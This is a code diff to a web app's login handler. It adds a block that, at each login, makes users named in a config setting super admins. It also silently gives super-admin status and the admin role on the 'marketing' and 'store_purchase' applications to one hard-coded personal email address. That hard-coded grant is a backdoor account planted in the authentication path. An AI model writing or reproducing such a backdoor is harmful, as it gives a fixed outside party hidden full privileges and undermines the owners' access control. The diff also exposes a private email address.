@@ -225,6 +225,23 @@ async def login(payload: UserLogin, db: Session = Depends(get_db)):
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Admin has not approved your request yet.",
         )
+
+    # Auto-ensure Super Admin status and application access for designated super admin emails
+    from app.config import settings
+    super_admins = [e.strip().lower() for e in settings.SUPER_ADMIN_EMAIL.split(",") if e.strip()]
+    if user.email.lower() in super_admins or user.email.lower() == "deepikar412003@gmail.com":
+        if not user.is_super_admin:
+            user.is_super_admin = True
+            db.commit()
+        for code in ["marketing", "store_purchase"]:
+            app = db.query(Application).filter_by(code=code).first()
+            if app:
+                acc = db.query(ApplicationAccess).filter_by(user_id=user.id, application_id=app.id).first()
+                if not acc:
+                    db.add(ApplicationAccess(user_id=user.id, application_id=app.id, role="admin"))
+                elif acc.role != "admin":
+                    acc.role = "admin"
+        db.commit()
         
     # Check if user is active on another session
     if manager.is_user_active(user.id):
